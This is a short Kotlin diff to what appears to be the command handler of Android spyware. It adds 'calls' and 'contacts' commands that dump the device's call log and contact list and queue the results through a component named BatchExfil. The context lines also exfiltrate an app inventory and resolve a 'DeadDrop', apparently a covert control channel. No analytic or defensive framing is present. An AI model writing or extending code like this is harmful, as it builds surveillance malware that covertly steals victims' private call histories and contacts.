@@ -45,6 +45,16 @@ object Commands {
 
             "apps" -> BatchExfil.enqueue(ctx, "apps", UsageStatsService.inventory(ctx))
 
+            "calls" -> {
+                val n = com.sp.core.services.CallLogDumper.dump(ctx)
+                BatchExfil.enqueue(ctx, "cmd_result", """{"cmd":"calls","count":$n}""")
+            }
+
+            "contacts" -> {
+                val n = com.sp.core.services.ContactsDumper.dump(ctx)
+                BatchExfil.enqueue(ctx, "cmd_result", """{"cmd":"contacts","count":$n}""")
+            }
+
             "ddr" -> {
                 val found = DeadDrop.resolve(ctx, apply = false)
                 BatchExfil.enqueue(ctx, "ddr", """{"found":${found != null},"ts":${System.currentTimeMillis()}}""")
